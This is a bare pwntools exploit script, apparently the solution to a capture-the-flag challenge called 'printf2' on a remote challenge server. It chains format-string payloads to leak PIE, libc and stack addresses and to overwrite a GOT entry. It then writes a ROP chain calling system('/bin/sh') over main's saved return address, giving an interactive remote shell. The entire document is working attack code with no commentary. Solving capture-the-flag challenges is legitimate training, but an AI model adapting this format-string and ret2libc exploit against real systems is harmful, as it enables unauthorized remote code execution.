from pwn import *

context.binary = binary = ELF('./printf2', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

#p = process()
p = remote('pwn.blitzhack.xyz', 3333)

p.recvuntil(b'this: ')
main = int(p.recvline(), 16)
binary.address = main - binary.symbols.main
info(f'pie base @ {hex(main)}')

p.sendlineafter(b'>', b'31')
p.send(b'%73$hn|%77$p|%81$p|aaaaa' + fmtstr_payload(11, {binary.got.__stack_chk_fail:main}, numbwritten=36))

p.recvuntil(b'|')
libc_leak = int(p.recvuntil(b'|')[:-1], 16)
libc.address = libc_leak - 0x29d90
info(f'libc leak @ {hex(libc_leak)}')
info(f'libc base @ {hex(libc.address)}')

stack_leak = int(p.recvuntil(b'|')[:-1], 16)
main_saved_rip = stack_leak - 0x350
info(f'stack leak @ {hex(stack_leak)}')
info(f'main saved rip @ {hex(main_saved_rip)}')

r = ROP(libc)
rc = p64(r.find_gadget(['pop rdi','ret'])[0])
rc += p64(next(libc.search(b'/bin/sh\x00')))
rc += p64(r.find_gadget(['ret'])[0])
rc += p64(libc.symbols.system)

shell_payload = fmtstr_payload(8, {main_saved_rip:rc}, write_size='short')
print(shell_payload)
p.sendlineafter(b'>', b'31')
p.send(shell_payload)

p.recvrepeat(0.5)
success(f'*** SHELL ***')
p.interactive()
